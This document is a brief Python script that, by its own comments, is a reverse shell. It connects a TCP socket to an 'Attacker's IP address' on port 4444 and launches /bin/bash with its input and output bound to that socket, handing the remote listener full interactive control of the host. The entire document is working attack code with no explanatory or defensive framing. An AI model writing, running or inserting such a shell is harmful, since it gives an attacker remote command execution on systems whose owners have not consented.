import socket
import subprocess


HOST = '192.168.10.128' # Attacker's IP address
PORT = 4444 # Attacker's listening port

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)    
s.connect((HOST, PORT))


subprocess.Popen(['/bin/bash'], shell=True, stdin=s, stdout=s, stderr=s)